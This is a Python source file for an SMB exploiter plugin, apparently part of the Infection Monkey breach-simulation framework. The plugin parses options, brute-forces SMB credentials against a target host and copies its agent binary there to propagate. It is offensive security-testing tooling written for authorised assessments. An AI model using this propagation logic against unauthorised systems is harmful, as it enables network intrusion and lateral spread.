import logging
from functools import partial
from pprint import pformat
from typing import Any, Dict, Sequence
from uuid import UUID

# common imports
from common.event_queue import IAgentEventPublisher
from common.types import Event
from common.utils.code_utils import del_key

# dependencies to get rid of or internalize
from infection_monkey.exploit import IAgentBinaryRepository
from infection_monkey.exploit.tools import (
    BruteForceCredentialsProvider,
    BruteForceExploiter,
    generate_brute_force_credentials,
)
from infection_monkey.exploit.tools.helpers import get_agent_dst_path
from infection_monkey.i_puppet import ExploiterResultData, TargetHost
from infection_monkey.propagation_credentials_repository import IPropagationCredentialsRepository

from .smb_command_builder import build_smb_command
from .smb_exploit_client_factory import SMBExploitClientFactory
from .smb_options import SMBOptions

logger = logging.getLogger(__name__)


class Plugin:
    def __init__(
        self,
        *,
        plugin_name: str,
        agent_id: UUID,
        agent_event_publisher: IAgentEventPublisher,
        agent_binary_repository: IAgentBinaryRepository,
        propagation_credentials_repository: IPropagationCredentialsRepository,
        **kwargs,
    ):
        self._plugin_name = plugin_name
        self._agent_event_publisher = agent_event_publisher
        self._agent_binary_repository = agent_binary_repository
        self._credentials_provider = BruteForceCredentialsProvider(
            propagation_credentials_repository, generate_brute_force_credentials
        )

    def run(
        self,
        *,
        host: TargetHost,
        servers: Sequence[str],
        current_depth: int,
        options: Dict[str, Any],
        interrupt: Event,
        **kwargs,
    ) -> ExploiterResultData:
        # HTTP ports options are hack because they are needed in fingerprinters
        del_key(options, "http_ports")

        try:
            logger.debug(f"Parsing options: {pformat(options)}")
            smb_options = SMBOptions(**options)
        except Exception as err:
            msg = f"Failed to parse SMB options: {err}"
            logger.exception(msg)
            return ExploiterResultData(error_message=msg)

        command_builder = partial(build_smb_command, servers, current_depth)
        smb_exploit_client_factory = SMBExploitClientFactory(
            self._agent_event_publisher, host, smb_options
        )

        brute_force_exploiter = BruteForceExploiter(
            self._plugin_name,
            get_agent_dst_path(host),
            command_builder,
            smb_exploit_client_factory,
            self._credentials_provider,
            self._agent_binary_repository,
            self._agent_event_publisher,
        )

        try:
            logger.debug(f"Running SMB exploiter on host {host.ip}")
            return brute_force_exploiter.exploit_host(host, interrupt)
        except Exception as err:
            msg = f"An unexpected exception occurred while attempting to exploit host: {err}"
            logger.exception(msg)
            return ExploiterResultData(error_message=msg)
